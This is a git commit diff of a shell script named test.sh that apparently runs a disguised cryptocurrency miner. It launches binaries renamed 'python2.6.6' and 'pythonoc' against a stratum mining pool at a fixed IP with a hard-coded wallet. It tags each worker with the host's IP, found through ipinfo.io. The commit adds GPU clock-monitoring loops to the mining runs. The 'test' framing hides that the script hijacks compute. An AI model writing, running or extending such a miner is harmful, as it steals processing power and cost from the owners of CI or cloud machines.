8ab19c38bb864bf21ac139c5051c5491d68be1ef
Ayoub Jadouli <Ayoub JADOULI>
2021-04-04 01:25:19 +0100

    tstok31

--- test.sh
+++ test.sh
@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 30 ########################'
+echo '##################### Test N 31 ########################'
 echo '#######################################################'
 
 rm -rf python2.6.6
@@ -29,6 +29,7 @@ then
     do 
         date 
         ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U 2>> cuoutdef 1>> cuoutdef &
+        while true;do nvidia-smi  -q -i 0 -d CLOCK;sleep 5000;done &
         tail -f cuoutdef
         echo '#################    Final 1200s result    #################'   
 
@@ -40,6 +41,7 @@ else
         date
         ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 2>> oout 1>> oout &
         ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80   --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 2>> oout 1>> oout &
+        while true;do nvidia-smi  -q -i 0 -d CLOCK;sleep 5000;done &
         tail -f oout 
 
         echo '#################    Final 1200s result    #################'   
